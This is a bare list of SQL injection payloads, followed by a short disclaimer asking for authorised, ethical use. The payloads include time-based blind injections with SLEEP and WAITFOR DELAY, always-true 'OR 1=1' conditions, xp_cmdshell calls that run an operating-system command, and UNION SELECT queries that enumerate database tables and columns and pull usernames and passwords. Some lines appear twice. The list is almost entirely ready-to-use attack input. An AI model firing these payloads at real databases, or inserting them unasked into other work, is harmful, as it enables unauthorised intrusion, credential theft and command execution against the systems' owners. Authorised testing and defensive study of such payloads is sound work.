1' AND SLEEP(5) --
1' AND SLEEP(10) --
1' AND 1=1 --
' OR '1'='1' AND SLEEP(5) --
' OR '1'='1' AND SLEEP(10) --
' OR '1'='1' --
1' AND IF(1=1, SLEEP(5), 0) --
1' AND IF(1=1, SLEEP(10), 0) --
1' AND IF(1=0, SLEEP(5), 0) --
' OR '1'='1' AND IF(1=1, SLEEP(5), 0) --
' OR '1'='1' AND IF(1=1, SLEEP(10), 0) --
' OR '1'='1' AND IF(1=0, SLEEP(5), 0) --
1' AND IF(1=1, SLEEP(5), 0) --
1' AND IF(1=1, SLEEP(10), 0) --
1' AND IF(1=0, SLEEP(5), 0) --
1' WAITFOR DELAY '0:0:5' --
' WAITFOR DELAY '0:0:5' --
1'; EXEC xp_cmdshell('ping yoursite.com') --
' OR '1'='1'; EXEC xp_cmdshell('ping yoursite.com') --
' UNION SELECT null FROM dual WHERE SLEEP(5) --
' UNION SELECT null,null FROM dual WHERE SLEEP(5) --
' UNION SELECT @@version, null --
' UNION SELECT table_name,null FROM information_schema.tables --
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='yourtable' --
' UNION SELECT username,password FROM users WHERE id=1 --

Please remember that these payloads are for educational and ethical purposes only. Always ensure you have proper authorization before performing any security testing on a system. Unethical or unauthorized testing can lead to legal consequences.


